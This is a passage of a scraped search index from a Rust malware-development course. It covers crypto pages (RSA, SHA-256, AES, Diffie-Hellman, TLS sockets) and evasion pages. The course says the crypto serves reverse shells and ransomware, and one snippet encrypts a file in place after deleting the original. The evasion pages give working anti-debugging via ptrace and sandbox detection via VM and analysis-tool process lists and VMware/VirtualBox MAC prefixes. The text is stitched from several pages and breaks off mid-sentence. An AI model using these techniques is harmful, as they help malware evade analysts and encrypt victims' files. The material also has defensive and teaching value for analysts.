println!(\"The content of the file is: {}\", &amp;file_content); \n    fs::remove_file(path).expect(\"Can't remove the file\"); // Remove the file\n\n    let aes_key = Aes256Gcm::generate_key(OsRng); \n    let cipher = Aes256Gcm::new(&amp;aes_key); \n    let nonce = Aes256Gcm::generate_nonce(&amp;mut OsRng); \n    let ciphertext = cipher.encrypt(&amp;nonce, file_content.as_ref()).expect(\"Can't encrypt the message!\");\n    println!(\"The encrypted message is: {:?}\", ciphertext);\n\n    let mut file = fs::File::create(path).expect(\"Can't create the file\"); // Create a new file with the same name\n    file.write_all(&amp;ciphertext).expect(\"Can't write the ciphertext\");\n}\n\nAfter running our code, here is our output:\n\nAs well as the content of our file which is indeed encrypted:\n\nThis section is now complete. In the next one, we will implement examples concerning Diffie-Hellman to conclude this chapter on cryptography.\n","id":" https://nu11busters.github.io/rust-maldev-course/crypto/aes/","title":"Symmetric encryption"}," https://nu11busters.github.io/rust-maldev-course/crypto/df/":{"body":"The use of Diffie-Hellman allows you to exchange keys in a public environment (on an open network) to subsequently communicate securely. The two parties involved in this exchange will each create a secret in parallel, which will be randomly generated. This secret will undergo calculations to generate the associated public key. This key, held by both parties, will be exchanged with each other. Once in possession of this key, each will again perform a calculation by adding their secret. These different steps ultimately allow both parties to have exactly the same key, but their respective secret never appears in the public exchanges, making it impossible for someone intercepting their communication to find the value of this secret key. The goal of Diffie-Hellman is thus to create the same key to communicate later without having to exchange private information in a public space. Here is a diagram to visualize these exchanges:\n\nImplementation of Diffie-Hellman🔗\nIn this section, we recommend creating a new project via cargo new. We will use the following crates, to be added to your Cargo.toml:\n\nrand_core = { version = \"0.6.4\", features = [\"getrandom\"] }\nx25519-dalek = 2.0.0\n\nrand_core will be used for secret generation and will rely on a feature of the crate getrandom. This crate is dedicated to generating random numbers based on the operating system on which it is called. x25519-dalek is the crate that implements Diffie-Hellman.\nFrom what we have seen previously, we will need to generate a secret/public key pair for each party. Subsequently, the public key of each will be sent to the other to create the shared key. Here is the corresponding code:\nuse x25519_dalek::{EphemeralSecret, PublicKey};\nuse rand_core::OsRng;\n\nfn main() {\n    // Create the first pair of secret and public key with an ephemeral secret (can be used just one time)\n    let first_secret = EphemeralSecret::random_from_rng(OsRng);\n    let first_secret_public_key = PublicKey::from(&amp;first_secret);\n\n    // Create the second pair of secret and public key\n    let second_secret = EphemeralSecret::random_from_rng(OsRng);\n    let second_secret_public_key = PublicKey::from(&amp;second_secret);\n\n    // Create the two same shared keys\n    let first_shared = first_secret.diffie_hellman(&amp;second_secret_public_key);\n    let second_shared = second_secret.diffie_hellman(&amp;first_secret_public_key);\n\n    // Confirm that the two generated shared keys are the same\n    assert_eq!(first_shared.as_bytes(), second_shared.as_bytes());\n}\n\nThe EphemeralSecret structure calls the \"random_from_rng\" method, which takes a random number provided by OsRng as a parameter. This first secret is then passed as a parameter to the PublicKey structure within the \"from\" method to give us a public key. This key is then assumed to be transferred between the two parties. Each will subsequently use the other's public key as a parameter of the diffie_hellman method applied to their respective secret. Two shared keys result from this process. After running the program, no errors are detected, indicating that our final instruction: assert_eq! is valid and that the two keys are identical.\n\nThe two shared keys held by our two parties are now usable to encrypt their future communications. The corresponding code is available in the next section.\n","id":" https://nu11busters.github.io/rust-maldev-course/crypto/df/","title":"Diffie-Hellman"}," https://nu11busters.github.io/rust-maldev-course/crypto/intro/":{"body":"In this section, we'll look at the practical aspects of cryptography, focusing on key elements such as symmetric, asymmetric and Diffie-Hellman encryption, hash functions and ending with SSL/TLS sockets. We won't go into detail about how these elements work, as cryptography itself would take up an entire course. Nevertheless, there will be a theoretical section followed by practical implementations.\nImplementing cryptographic functions or hashes within our malware will be useful, in particular to avoid transmitting our data streams in clear text in the case of reverse shell or when developing the practical case on ransomware.\nWe have selected RustCrypto as the source of crates for this course, as this project is used and maintained by a large number of users. What's more, its updates are audited by external parties to ensure that the implementations are free of security flaws. The openssl crate will be used for sockets.\nUsing RustCrypto🔗\nThe GitHub directory available here : RustCrypto contains a set of crates relating to cryptography. In particular, we'll be using :\n\nRSA for asymmetric encryption\nSHA-2 for the hash function\nAES-GCM for symmetric encryption\nx25519_dalek for Diffie-Hellman\n\nTo import the crates into your projects, simply select the one you want from those available on the RustCrypto GitHub, then access its crates.io link:\n\nOn this platform, you'll find information about the crate, such as the last update, file size, implementation examples, dependencies and available versions. In this example, we'll be using RSA. To import it into your project, simply add the following line to our Cargo.toml dependency file, which is present once the project has been created via cargo new :\n\nThe procedure will be the same for the other crates discussed in this chapter, except for x25519_dalek, which will be available via another GitHub directory: 25519-dalek. We advise you to read the documentation for the crates we'll be using, as you'll find the answers to your questions much more easily than by searching the Internet. The answers will also be of higher quality, enabling you to really understand how the functions, methods, traits or data used work.\n","id":" https://nu11busters.github.io/rust-maldev-course/crypto/intro/","title":"Introduction"}," https://nu11busters.github.io/rust-maldev-course/crypto/rsa/":{"body":"RSA is known to be used by default when generating SSH keys with the ssh-keygen utility available on most Linux distributions. It can be represented as follows:\n\nWe're going to reproduce a similar key generation and then encrypt and decrypt a message in an example of Rust code. We recommend that you create a new project for the practical part that follows via cargo new.\nTwo dependencies are required and must be added to your cargo.toml file. These are the most recent versions at the time of writing:\n\nrsa = 0.9.3\nrand = 0.8.5\n\nWithin your main.rs file, we import the structures and methods required for RSA key generation:\nuse rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};\n\nWe'll then use the documentation to create our private and public keys. These two objects are structures defined in the rsa crates and are available here: private and public. As indicated, we need a random number rng: &amp;mut R to be created with rand and a key size bit_size, set to 2048, to use the new() method. As error handling is not the priority here, we'll simply handle them with an expect(). The code will be as follows: \n# src/main.rs\nuse rand;\nuse rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};\nfn main() {\n    let mut rand_number = rand::thread_rng();\n    let key_size = 2048;\n    let private_key =\n        RsaPrivateKey::new(&amp;mut rand_number, key_size).expect(\"Failed to generate to private key\");\n    let public_key = RsaPublicKey::from(&amp;private_key);\n}\n\nThe public key is generated by passing a reference to the previously created private key. We then have several possibilities for using our key pair. We'll look at two use cases in the next few lines: encrypting and decrypting a string, and recovering our public and private keys.\nThe string we're going to use is the following:\nlet data = b \"A message to be encrypted\";\n\nWithin our RsaPublicKey structure, an implementation has been made to enable us to encrypt a message: the \"encrypt\" function. The public key is used to encrypt the data, while the private key is used to decrypt it.\n\nThis function takes as parameters a random number (in the same way as our key generation), a padding and the message we wish to encrypt in the form of an array of u8 data (corresponding to the ASCII value of our letters within the message). A simple check is added, the \"assert_ne\", to verify that the value of our encrypted message is indeed different from our base message. The code to be added is as follows:\nlet data = b \"A message to be encrypted\";\nlet mut rand_number = rand::thread_rng();\nlet data_encrypted = public_key\n    .encrypt(&amp;mut rand_number, Pkcs1v15Encrypt, &amp;data[..])\n    .expect(\"Failed to encrypt the data\");\nassert_ne!(&amp;data[..], &amp;data_encrypted[..]);\n\nThe final data we recover is \"data_encrypted\", which is a u8 vector containing our encrypted message. To decrypt our message, we can look at the documentation associated with our private key. Within the implementations, the \"decrypt\" function is proposed. It takes as parameters a padding (in the same way as \"encrypt\") and the message to be decrypted. It will return a vector of u8, which will be exactly identical to our u8 array in the \"data\" variable at the beginning.\n\nThe result can then be displayed in ASCII using a loop:\nfor data in data_decrypted {\n    print!(\"{}\", data.to_ascii_lowercase() as char);\n}\nprintln!();\n\n\nIf you simply wish to display or save your public or private key, new imports are required: pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey, LineEnding} which are included in the rsa crate. The final import block will therefore be :\nuse rsa::{\n    pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey, LineEnding},\n    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,\n};\n\nWe chose pkcs1 because it supports a classic format for encoding RSA keys in binary (DER) or textual (PEM) form. In our example, pkcs8 could also have been used, as this is the mode most often used today. To differentiate between them, we can look at the value of the first line once our key has been exported to a file.\nFor pkcs1, we'll have :\n-----BEGIN RSA PRIVATE KEY-----\nand for pkcs8 :\n-----BEGIN PRIVATE KEY-----.\nA search on the Internet for a way to export RSA keys in Rust yielded initial results indicating the use of the \"export-rsa\" crate:\n\nWe advise you to check the crates.io links before using a crate because, as in this case, the crate is deprecated and an indication is given as to which crate has been replaced.\n\nThis is just an example, but it could apply to your next crate search and use. Having taken this wrong road ourselves at the outset, we returned to the native implementation via the rsa crate, where the key export information was already present before our internet search.\nReturning to our exports, two Traits will be used: EncodeRsaPublicKey and EncodeRsaPrivateKey both to display the keys and to save them in a file. Within these Traits, we'll use the to_pkcs1_pem method, which takes as parameter a reference to our key and one of the LineEnding enumeration values. We've chosen \"LF\", which corresponds to a simple line feed (on Unix systems) \\n. The final data will be a String if there was no error:\nlet pub_pem = EncodeRsaPublicKey::to_pkcs1_pem(&amp;public_key, LineEnding::LF);\nprintln!(\"{:?}\", pub_pem.unwrap());\n\nlet priv_pem = EncodeRsaPrivateKey::to_pkcs1_pem(&amp;private_key, LineEnding::LF);\nprintln!(\"{:?}\", priv_pem.unwrap());\n\nThis will correctly display the public and private key at runtime.\n\nThe last point in this chapter is to save our keys in PEM format. Instead of using the to_pkcs1_pem method, write_pkcs1_pem_file will be used. The arguments are the same as above, but one must be added: the path where the file will be written, corresponding to path_pub and path_priv in our code and pointing to the project folder. Don't forget to modify this data when you implement it.\nlet path_pub = String::from(\"/home/bobby/Documents/crypto/id_rsa.pub\");\nlet path_priv = String::from(\"/home/bobby/Documents/crypto/id_rsa\");\n\nEncodeRsaPublicKey::write_pkcs1_pem_file(&amp;public_key, path_pub, LineEnding::LF)\n    .expect(\"Failed to create the key file\");\nEncodeRsaPrivateKey::write_pkcs1_pem_file(&amp;private_key, path_priv, LineEnding::LF)\n    .expect(\"Failed to create the key file\");\n\nAfter execution, we can see the files in our project via an ls -lah :\n-rw------- 1 bobby bobby 1.7K Nov 23 15:24 id_rsa\n-rw-r--r-- 1 bobby bobby 426 Nov 23 15:24 id_rsa.pub\n\nAnd a \"file\" confirms that the system has recognized our key:\n┌──(kali@Kali)-[~/Documents/crypto]\n└─$ file id_rsa\nid_rsa: PEM RSA private key\n\nIt's now possible to use your public and private keys to exchange information via ssh, for example. This first chapter on cryptography with RSA is now complete, and you'll find the full code in the section just below.\n","id":" https://nu11busters.github.io/rust-maldev-course/crypto/rsa/","title":"Asymmetric encryption"}," https://nu11busters.github.io/rust-maldev-course/crypto/sha256/":{"body":"After implementing RSA in the previous section, we will use the sha-256 implementation with Rust via the crate we mentioned in the introduction: sha2. This part can be useful for verifying the integrity of data such as files or strings, as well as generating passwords as examples. According to the crate documentation, six standard algorithms are available with sha2; here we will use sha-256.\nTo practice the concepts related to sha-256, we recommend creating a new project via cargo new.\nImplementation of sha-256 on a String🔗\nOur first example concerns applying the hash function on a simple string. To do this, you will need to integrate the relevant crates into your Cargo.toml:\n\nhex = 0.4.3\nsha2 = 0.10.8\nhex-literal = 0.4.1\n\nNext, as you probably expect, we will define a String (the one to be hashed) and a \"hasher\" (the object used to hash our String). For this \"hasher\", we create it via the Digest trait and its new() method. This new() method simply returns a Self: creating a new instance of \"hasher\". We will insert values into this \"hasher\" via the update method, which can be called multiple times, and then we will finalize its creation via the finalize method. The \"hex\" crate will be used to convert our result into a hexadecimal value, and hex_literal will help us compare our \"hasher\" object with a hex value calculated by another means. Here is the code snippet related to this first part:\nuse sha2::{Digest, Sha256};\nuse hex_literal::hex;\n\nfn main() {\n    let mut hasher = Sha256::new();\n    let data = b\"hello world\";\n    hasher.update(data);\n    let hash = hasher.finalize();\n\n    println!(\"Binary hash: {:?}\", hash); \n\n    let hex = hex::encode(&amp;hash);\n    println!(\"hex-encoded hash: {}\", hex);\n}\n\n\nIf you want to ensure that your hash value is correct, you can use a site like xorbin to calculate it. To ensure the equivalence between our code and the calculated value later, we implement another piece of code.\nuse hex_literal::hex;\n// ----- previous code -----\n    assert_eq!(\n        hash[..],\n        hex!(\"b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9\")[..]\n    );\n}\n\nIf the compilation and execution run without errors, it means the hash calculated by your function is correct! Now, we will implement sha-256 on a file.\nImplementation of sha-256 on a File🔗\nThe methodology is similar for creating the hasher; we just need to handle opening the target file and reading its content, which can be subject to potential errors (such as file not found or read/write permissions). In our example, we create a file hello.txt at the project level containing the string hello world. The data written in this file being the same as our initial String, the result of our two hash calculations should be identical in this case. Once again, error handling is not our priority here, so we will handle them with simple expect(). Here is the new code to implement:\nuse hex_literal::hex;\nuse sha2::{Digest, Sha256};\nuse std::{fs, io};\n\nfn main() {\n    let path = \"hello.txt\";\n    let mut file = fs::File::open(&amp;path).expect(\"Can't open the file\");\n    let mut hasher_file = Sha256::new();\n    io::copy(&amp;mut file, &amp;mut hasher_file).expect(\"Can't copy\");\n    let hash_file = hasher_file.finalize();\n    println!(\n        \"The hash for the file {:?} is: \\n{:?}\",\n        &amp;path,\n        hex::encode(hash_file)\n    );\n}\n\nIf you want to compare the return values of your hashes, you can use the assert_eq! macro in the same way as previously by including the hash calculated on the string and the newly calculated hash on our file. After execution, we can see that our two hashes are indeed identical as shown in the following figure:\n\nImplementation of sha-256 for Password Hashing🔗\nThe last point we will cover is creating a hashed password with sha-256. This method is for demonstration purposes only; other specific crates are recommended for creating hashed passwords such as sha_crypt.\nYou won't be surprised that in this part we will use the \"hasher\" system again. A function will be created where we will take as parameters the password, a salt (a value added to the base password so that two identical passwords do not return the same value with a different salt), and the value that will contain the output of our function. The type returned by this function will be a Digest (translated in French as an \"envelope\", a wrapper linked to cryptographic functions that has a fixed size). The corresponding code is as follows.\nuse sha2::{Digest, Sha256};\n\nfn hash_password&lt;D: Digest&gt;(password: &amp;str, salt: &amp;str, output: &amp;mut [u8]) {\n    let mut hasher = D::new();\n    hasher.update(password.as_bytes());\n    hasher.update(b\"$\");\n    hasher.update(salt.as_bytes());\n    output.copy_from_slice(&amp;hasher.finalize())\n}\n\nfn main() {\n    let mut buf1 = [0u8; 32];\n    hash_password::&lt;Sha256&gt;(\"Th@tsAg0odP@ss\", \"salt\", &amp;mut buf1);\n    println!(\"The hash is {:?}\", hex::encode(buf1));\n}\n\nIn our function, we encode the password passed as a parameter and the salt with as_bytes to convert the characters into bytes and add the character $ to delimit the password from the salt. We copy the result of our hasher.finalize() into the output variable, a value returned by the function. This value will be contained in an array of 32 u8 in our main() function within buf1. After execution, our hashed and salted password appears.\n\nWe have now finished this section on the implementation of sha-256. You will find the source code available in the next section.\n","id":" https://nu11busters.github.io/rust-maldev-course/crypto/sha256/","title":"Hashing"}," https://nu11busters.github.io/rust-maldev-course/crypto/sockets/":{"body":"The SSL/TLS protocol suite is particularly known for being used within web browsers during HTTPS exchanges. They operate in client-server mode and add a layer of security during exchanges by authenticating the server and ensuring data confidentiality. We will base this on the openssl crate and create two programs, a server, and a client. In our case, we use the crate's automatic detection to use openssl; you can refer to the \"Automatic\" section of the documentation for necessary installations. After creating a new project, you can add the crates we will use via: cargo add anyhow and cargo add openssl.\nCreating the Server🔗\nWe will start by implementing the server; the crates to import into our main.rs file are as follows:\nuse anyhow::Result;\nuse openssl::ssl::{SslAcceptor, SslFiletype, SslMethod, SslStream};\nuse std::io;\nuse std::net::{TcpListener, TcpStream};\nuse std::sync::Arc;\nuse std::thread;\n\nWe use the SslAcceptor structure to create the \"wrapper\" that will contain the server-side data streams and use the default builder, which is mozilla_intermediate. This builder takes as a parameter the ssl method we want to use: tls_server(). Within this \"builder,\" we will also specify the private key and certificate used to encrypt the streams. These two elements can be generated via the following command:\nopenssl req -x509 -newkey rsa:4096 -keyout server.key -out server.pem -sha256 -days 365**\n\nIn the command, x509 is one of the standard formats for certificates, 4096 is the key size, server.key and server.pem are our output files, and 365 corresponds to the validity period of our certificate.\nSubsequently, this \"builder\" will be converted into Arc&lt;SslAcceptor&gt;, which will allow creating references with the same \"ownership\" over the object. Finally, we will define a \"listener\" responsible for listening for incoming connections. The corresponding code so far is as follows:\nfn main() -&gt; Result&lt;()&gt; {\n    // create acceptor: a type which wraps server-side streams in a TLS session\n    // mozilla_intermediate is the builder configured to connect to non legacy clients\n    let mut acceptor = SslAcceptor::mozilla_intermediate(SslMethod::tls_server())?;\n\n    // we add the private key and the certificate to use for the server into the builder\n    acceptor.set_private_key_file(\"server.key\", SslFiletype::PEM)?;\n    acceptor.set_certificate_chain_file(\"server.pem\")?;\n    acceptor.check_private_key()?;\n\n    // will consume the SslAcceptorBuilder and return a SslAcceptor - Arc will provide a shared ownership regarding a thread\n    let acceptor = Arc::new(acceptor.build());\n    // create the listener: the socket server that will receive the connection\n\n    let listener = TcpListener::bind(\"0.0.0.0:8080\")?;\n    println!(\"[+] Server listening\");\n\nWith the \"listener\" ready to accept connections, we now need to manage them. A loop will be used to retrieve each incoming connection and create a new \"thread\" used by the handle_client() function. If an error occurs, it will be caught by the \"match\" and returned. The Ok(()) at the end is used via anyhow to indicate that the execution went smoothly.\n    for stream in listener.incoming() {\n        match stream {\n            Ok(stream) =&gt; {\n                println!(\"New connection: {}\", stream.peer_addr()?);\n                let acceptor = acceptor.clone();\n                thread::spawn(move || {\n                    let stream = acceptor.accept(stream)?;\n                    handle_client(stream)\n                });\n            }\n            Err(e) =&gt; {\n                println!(\"Error: {}\", e);\n            }\n        }\n    }\n    Ok(())\n}\n\nThe remaining block to implement is the client handling function. This function will take a TCP data stream as a parameter and loop between a user request, writing this data into a \"buffer\", sending it, and receiving an acknowledgment message from the client. The input data will be formed of 1024-byte blocks. We use from_utf8_lossy because this function allows us to use our byte array directly, unlike the from_utf8 function which requires a vector.\n// take an SslStream in argument to handle data received\nfn handle_client(mut stream: SslStream&lt;TcpStream&gt;) -&gt; Result&lt;()&gt; {\n    loop {\n        println!(\"Type the message to send: \");\n        let mut input = String::new();\n        io::stdin().read_line(&amp;mut input)?; // read the user input and insert it into the input variable\n        stream.ssl_write(input.as_bytes())?; // same as write but returning a SslError in case of error - write the input into the stream\n        let mut data = [0u8; 1024]; // buffer containing the data that will be received\n        stream.ssl_read(&amp;mut data)?; // like ssl_write but for read - read data send by the client\n        let string = String::from_utf8_lossy(&amp;data); // converting a slice of bytes to a string\n        println!(\"{}\", string);\n    }\n}\n\nCreating the Client🔗\nThe crates we need to import into our main are as follows:\nuse anyhow::Result;\nuse openssl::ssl::{SslConnector, SslMethod};\nuse std::net::TcpStream;\n\nIn our client program, we will use an SslConnectorBuilder instead of an SslAcceptorBuilder. This structure also takes an Ssl method parameter that we set to tls_client(). We then set the SSL verification mode to NONE to prevent our server program from requesting a client certificate and for the client not to worry about the server certificate's validity. Using the previous builder, we create an SslConnector and a TcpStream on our local IP address and the same port as the server 8080. A loop is then defined to wait for a message from the server using a buffer of the same size as the server: 1024 bytes. Just like with the server, the ssl_read and ssl_write functions will be used for data reception and sending. A delimiter of the received data is necessary using the symbol \\n so that our buffer only displays the sent message and not the zeros that compose it if the message is less than 1024 bytes. After reception, we send a value back to the server to indicate that the data was received correctly. The complete code is as follows:\nfn main() -&gt; Result&lt;()&gt; {\n    let mut builder = SslConnector::builder(SslMethod::tls_client())?;\n    builder.set_verify(openssl::ssl::SslVerifyMode::NONE);\n    let connector = builder.build();\n    let address = \"127.0.0.1:8080\";\n    let stream = TcpStream::connect(address)?;\n    let mut stream = connector.connect(address, stream)?;\n    loop {\n        let mut recv = [0u8; 1024];\n        stream.ssl_read(&amp;mut recv)?;\n        let recv_string = String::from_utf8_lossy(&amp;recv);\n        let mut split = recv_string.split('\\n'); // split the string with our line return in server message\n        println!(\"{:?}\", split.next().unwrap());\n        stream.ssl_write(b\"Message received!\")?;\n    }\n}\n\nTo conclude, here are the terminal snapshots of the client and server after execution.\n\n\nThis chapter on cryptography is now complete.

It is used by debuggers such as GDB. Attaching to a process with this system call is called 'tracing'.\nIt's important to remember that a process can only be traced by a single tracer, as any new tracing attempt will return a \"Operation not permitted\" error.\nIn this section, we're going to use a self-tracing technique. If we manage to trace ourselves, then other programs won't be able to trace us, and if we don't manage to trace ourselves, this means that a program is already doing so (if our program is launched with GDB, for example) and we quit immediately.\nTo do this, we're going to use the Nix library with the ptrace feature:\n[dependencies]\nnix = { version = \"0.27.1\", features = [\"ptrace\"] }\n\nNix wraps the various parameters available in ptrace in separate functions provided in the nix::sys::ptrace module.\nWe're going to use the traceme function. This function indicates that our process is being traced by its parent, even if the parent is really not tracing our process.\nHere's an example calling traceme, if the function fails the program quits, otherwise it waits 10000 seconds:\nuse nix::sys::ptrace::traceme;\nuse std::time::Duration;\n\nfn main() {\n    match traceme() {\n        Ok(_) =&gt; std::thread::sleep(Duration::new(10000, 0)),\n        Err(e) =&gt; {\n            eprintln!(\"traceme() failed: {}\", e)\n        }\n    }\n}\n\nNow, when we try to attach GDB to the program, even as root, we get an error indicating that GDB can't attach because the program is already traced:\n&gt;&gt;&gt; ptrace_antidebug$ ./target/debug/ptrace_antidebug &amp;\n[1] 11850\n&gt;&gt;&gt; ptrace_antidebug$ gdb --pid=11850\n\n...\n\nAttaching to process 11850\nwarning: process 11850 is already traced by process 10323\nptrace: Operation not permitted.\n(gdb) quit\n&gt;&gt;&gt; ptrace_antidebug$ sudo gdb --pid=11850\n\n...\n\nAttaching to process 11850\nwarning: process 11850 is already traced by process 10323\nptrace: Operation not permitted.\n(gdb) quit\n&gt;&gt;&gt;\n\n","id":" https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-ptrace/","title":"Anti-debug with PTRACE"}," https://nu11busters.github.io/rust-maldev-course/evasion/detect-sandbox/":{"body":"In this section, we'll look at a few methods for detecting whether our malware has been launched in a sandbox.\nBy sandbox we mean a virtual machine or a system with analysis tools such as Wireshark or process explorer.\nDetection methods are as follows:\n\nlooking for specific processes such as virtual machine guest additions or analysis tools\nCheck whether MAC address OUI values match those of virtual machine editors\nUse the CPUID instruction available on x86 and x64 to find out if you're in a virtual machine and retrieve the hypervisor name.\n\nWe'll look at how to implement each method on Linux and Windows, in the same program, using the #[cfg()] macro.\nProcess detection🔗\nIn this method, we have a list of processes currently present in a sandbox that we wish to search for in the list of running processes.\nLinux🔗\nOn Linux, we use the following process list (in src/processus.rs):\n#[cfg(target_os = \"linux\")]\nconst SANDBOX_PROCESSES: [&amp;str; 18] = [\n    // vitual-box\n    \"vmtools\",\n    \"vboxservice\",\n    \"vbox\",\n    \"vboxtray\",\n    \"vboxclient\",\n    // vmware\n    \"vmware\",\n    \"vmsrvc\",\n    \"vmvss\",\n    \"vmrawdsk\",\n    \"vmusbmouse\",\n    \"vmscsi\",\n    \"vmxnet\",\n    \"vmx_svga\",\n    \"vmmemctl\",\n    \"vmhgfs\",\n    // others\n    \"wireshark\",\n    \"tshark\",\n    \"fiddler\",\n];\n\nYou can see that there are processes linked to VirtualBox and VMware, as well as Wireshark and Fiddler.\nThe following code retrieves the current processes, the command that launched them and compares them to the list above:\n#[cfg(target_os = \"linux\")]\n// Linux version\npub fn processus_check() -&gt; bool {\n    let mut count_processus_sandbox = 0;\n    let pid_dirs = fs::read_dir(\"/proc\").unwrap();\n    for dir_raw in pid_dirs {\n        if dir_raw.is_err() {\n            continue;\n        }\n        let dir = dir_raw.unwrap();\n        let dir_pid = dir.file_name().to_str().unwrap().parse::&lt;u32&gt;();\n        if dir_pid.is_err() {\n            // filters out non-PID files\n            continue;\n        }\n        let dir_pid = dir_pid.unwrap();\n        match fs::read(format!(\"/proc/{}/comm\", dir_pid)) {\n            Ok(res) =&gt; {\n                let comm_raw = String::from_utf8(res).unwrap();\n                let comm = comm_raw.strip_suffix('\\n').unwrap();\n                if SANDBOX_PROCESSES.contains(&amp;comm.to_lowercase().as_str()) {\n                    count_processus_sandbox += 1;\n                    println!(\"- Found sandbox processus: {}\", comm);\n                }\n            }\n            Err(_) =&gt; continue,\n        }\n    }\n\n    if count_processus_sandbox == 0 {\n        println!(\"- Found no sandbox processus\")\n    }\n    return count_processus_sandbox &gt; 0;\n}\n\nAs you can see, process information is retrieved using the /proc file system.

This function requests a snapshot of the list of processes currently running on the system. The result is stored in the variable toolhelp_snapshot_process as a chained list of PROCESSENTRY32.\nAn empty PROCESSENTRY32 structure is created, which will contain information on a process. This structure will be successively filled with values from the previously returned chained list.\nWe use the Process32First function to retrieve the first value from the chained list and place it in the process_entry variable.\nWe then retrieve the process name and check whether it's in the list of processes we're looking for.\nWe then use the Process32Next function to retrieve the next process in process_entry. If Process32Next returns an error, this indicates that the end of the list of running processes has been reached.\n\nMAC Addresses🔗\nTo detect whether we're in a virtual machine, we're going to use the fact that the first 3 bytes of a MAC address identify the card designer. This identifier is called the Organizationally Unique Identifier or OUI, and the list of OUI's is publicly available (Wireshark has a page for searching this list).\nIn this case, we'll use the following OUI list for Windows and Linux:\nconst SANBOX_MAC_ADDRESSES: [&amp;str; 5] = [\n    \"00:0C:29\", \"00:1C:14\", \"00:50:56\", \"00:05:69\", // VMware OUI\n    \"08:00:27\", // VirtualBox OUI\n];\n\nLinux🔗\nOn Linux, we can retrieve the list of interfaces on a machine using the /sys/class/net file system. In this folder we have a folder for each interface, and in each of these folders is the address file, which contains the MAC address of the interface.\nHere's the function that reads MAC addresses and compares them with the list defined above:\n#[cfg(target_os = \"linux\")]\npub fn mac_addresses_check() -&gt; bool {\n    let mut count_sandbox_mac = 0;\n    let ifaces_dirs = match std::fs::read_dir(\"/sys/class/net/\") {\n        Err(e) =&gt; {\n            println!(\"Error: {}\", e);\n            return false;\n        }\n        Ok(v) =&gt; v,\n    };\n    for iface_dir in ifaces_dirs {\n        if iface_dir.is_err() {\n            continue;\n        }\n        let iface_dir = iface_dir.unwrap();\n\n        let iface = iface_dir.file_name();\n        let iface = iface.to_str().unwrap();\n        match std::fs::read(format!(\"/sys/class/net/{}/address\", iface)) {\n            Ok(res) =&gt; {\n                let addr_raw = String::from_utf8(res).unwrap();\n                let addr = addr_raw.strip_suffix('\\n').unwrap();\n                if SANBOX_MAC_ADDRESSES.contains(&amp;addr.get(0..8).unwrap()) {\n                    println!(\"- Found sandbox MAC addresse: {:?}\", addr);\n                    count_sandbox_mac += 1;\n                }\n            }\n            Err(_) =&gt; continue,\n        }\n    }\n    if count_sandbox_mac == 0 {\n        println!(\"- Found no sandbox MAC address\")\n    }\n    return count_sandbox_mac &gt; 0;\n}\n\nThis function reads the folders in /sys/class/net to retrieve the interfaces, extracts the address of each of them and checks whether the first 3 bytes are in the previous MAC list.\nWindows🔗\nThe Windows API makes it easy to retrieve the list of network interfaces using the GetAdaptersInfo function. This function returns a chained list of IP_ADAPTER_INFO containing interface information (including MAC address).\nHere's the code using this function:\n#[cfg(target_os = \"windows\")]\npub fn mac_addresses_check() -&gt; bool {\n    let mut count_sandbox_mac: u32 = 0;\n    let mut out_buf_len = std::mem::size_of::&lt;IP_ADAPTER_INFO&gt;() as u32;\n    let mut raw_adaptor_mem: Vec&lt;u8&gt; = Vec::with_capacity(out_buf_len as usize);\n\n    unsafe {\n        if GetAdaptersInfo(\n            Some(raw_adaptor_mem.as_mut_ptr() as *mut IP_ADAPTER_INFO),\n            &amp;mut out_buf_len,\n        ) == ERROR_BUFFER_OVERFLOW.0\n        {\n            // retrieves the size needed to retrieve adapters\n            raw_adaptor_mem = Vec::with_capacity(out_buf_len as usize);\n            let res = GetAdaptersInfo(\n                Some(raw_adaptor_mem.as_mut_ptr() as *mut IP_ADAPTER_INFO),\n                &amp;mut out_buf_len,\n            );\n            if res != ERROR_SUCCESS.0 {\n                let mut err_msg_buffer: Vec&lt;u8&gt; = Vec::with_capacity(MAX_PREFERRED_LENGTH as usize);\n                FormatMessageA(\n                    FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n                    None,\n                    res,\n                    0,\n                    PSTR {\n                        0: err_msg_buffer.as_mut_ptr(),\n                    },\n                    MAX_PREFERRED_LENGTH as u32,\n                    None,\n                );\n                println!(\n                    \"Error: {}\",\n                    CStr::from_ptr(err_msg_buffer.as_mut_ptr() as *const i8)\n                        .to_str()\n                        .unwrap()\n                );\n                return false;\n            }\n        }\n    }\n\n    let mut iface: *mut IP_ADAPTER_INFO = unsafe { std::mem::transmute(&amp;raw_adaptor_mem) };\n    // looks up the MAC address of each adapter in the chained list\n    while iface as u64 != 0 {\n        let address = unsafe { (*iface).Address };\n\n        if SANBOX_MAC_ADDRESSES\n            .contains(&amp;format!(\"{:02X}:{:02X}:{:02X}\", address[0], address[1], address[2]).as_str())\n        {\n            println!(\n                \"- Found sandbox MAC addresse: {}\",\n                format!(\n                    \"{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}\",\n                    address[0], address[1], address[2], address[3], address[4], address[5]\n                )\n            );\n            count_sandbox_mac += 1;\n        }\n        iface = unsafe { (*iface).Next };\n    }\n\n    if count_sandbox_mac == 0 {\n        println!(\"- Found no sandbox MAC address\")\n    }\n    return count_sandbox_mac &gt; 0;\n}\n\nThe preceding code retrieves the list of interfaces using the GetAdaptersInfo function. If this function returns an error, we display the error message by retrieving it using the FormatMessageA function.\nWe then go through the chained list of interfaces, retrieving the MAC address from the IP_ADAPTER_INFO structure, and compare the first 3 bytes formatted as strings with the OUI's in the OUI list we're looking for.\nCPUID🔗\nThe last method in this section uses the CPUID instruction available on x86 and x64 to find out whether the system is virtualized, and if so, the name of the hypervisor.\nThis instruction retrieves various information about the processor, which is written to the EBC, ECX and EDX registers. The type of information requested is controlled by the EAX register (or RAX on x64, although only the first 32 bits are used).\nIn this section, we'll retrieve a flag indicating whether the system is virtualized and the name of the hypervisor.\nFollowing tests, these functionalities do not work optimally on Windows.\nFor example, the virtualization flag returns true if a hypervisor is present on the system, regardless of whether the system is virtualized or not, and is therefore only used on Linux.\nAs this method uses information provided by the processor, its implementation functions are not OS-dependent.\nVirtualization 